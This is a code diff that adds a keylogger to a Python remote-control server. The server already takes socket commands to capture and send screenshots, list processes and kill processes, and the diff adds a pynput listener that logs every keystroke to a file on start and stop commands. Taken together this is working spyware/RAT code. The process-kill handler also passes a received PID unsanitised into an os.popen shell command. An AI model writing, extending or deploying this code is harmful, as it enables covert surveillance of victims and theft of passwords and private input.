@@ -1,20 +1,24 @@
+from concurrent.futures import thread
 import socket
 import threading
 import os
 import pyautogui
 import time
+from pynput import keyboard
 
 # Commands
 CMD_SHUTDOWN = 'shutdown'
 CMD_TAKE_SCREENSHOT = 'screenshot'
 CMD_VIEW_PROCESSES = 'view_processes'
 CMD_KILL_PROCESS = 'kill_process'
+CMD_START_KEYLOGGER = 'start_keylogger'
+CMD_STOP_KEYLOGGER = 'stop_keylogger'
 
 # BUFFER
 BUFFER_SIZE = 1024
 
 # SCREENSHOT
-SCREENSHOT_PATH = './screenshots/'
+TMP_PATH = os.path.join(os.getcwd(), 'server/tmp')
 
 
 class Server:
@@ -24,6 +28,7 @@ class Server:
     self.addr = (self.host, self.port)
     self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     self.server.bind(self.addr)
+    self.keylogger_listener = None
 
   def run(self):
     self.server.listen(5)
@@ -46,7 +51,7 @@ class Server:
 
       elif data == CMD_TAKE_SCREENSHOT.encode():
         self.take_screenshot()
-        self.send_image(os.path.join(SCREENSHOT_PATH, 'screenshot.png'), conn)
+        self.send_image(os.path.join(TMP_PATH, 'screenshot.png'), conn)
 
       elif data == CMD_VIEW_PROCESSES.encode():
         processes = self.get_all_processes()
@@ -57,6 +62,15 @@ class Server:
       elif data == CMD_KILL_PROCESS.encode():
         pid = conn.recv(BUFFER_SIZE).decode()
         self.kill_process(pid)
+
+      elif data == CMD_START_KEYLOGGER.encode():
+        print('Starting keylogger')
+        self.start_keylogger()
+
+      elif data == CMD_STOP_KEYLOGGER.encode():
+        print('Stopping keylogger')
+        self.stop_keylogger()
+        
 
     conn.close()
     print(f"[DISCONNECTED] {addr} disconnected.")
@@ -69,7 +83,7 @@ class Server:
     
   def take_screenshot(self):
     screenshot = pyautogui.screenshot()
-    screenshot.save(os.path.join(SCREENSHOT_PATH, 'screenshot.png'))
+    screenshot.save(os.path.join(TMP_PATH, 'screenshot.png'))
   
   def send_image(self, path, conn):
     if os.path.exists(path):
@@ -82,7 +96,6 @@ class Server:
       f.close()
       conn.send(b'IMAGE_END')
 
-
   def get_all_processes(self):
     return os.popen('wmic process get description, processid, threadcount').read()
 
@@ -90,6 +103,34 @@ class Server:
     # os.system(f'TASKKILL /f /t /PID {pid}')
     os.popen('wmic process where processid=' + pid + ' call terminate')
 
+  def on_press(self, key):
+      with open(os.path.join(TMP_PATH, 'keylog.txt'), 'a') as f:
+      # Special charactersa
+        if key == keyboard.Key.enter:
+          key = '\n'
+        if key == keyboard.Key.space:
+          key = ' '
+        if key == keyboard.Key.tab:
+          key = '\t'
+        if key == keyboard.Key.shift:
+          key = '<shift>'
+        if key == keyboard.Key.backspace:
+          key = '<backspace>'
+        if key == keyboard.Key.esc:
+          key = '<esc>'
+        if key == keyboard.Key.ctrl:
+          key = '<ctrl>'
+
+        key = str(key).replace("'", '')
+
+        f.write(str(key))
+
+  def start_keylogger(self):
+    self.keylogger_listener = keyboard.Listener(on_press=self.on_press)
+    self.keylogger_listener.start()
+   
+  def stop_keylogger(self):
+    self.keylogger_listener.stop()
 
 if __name__ == '__main__':
   server = Server()
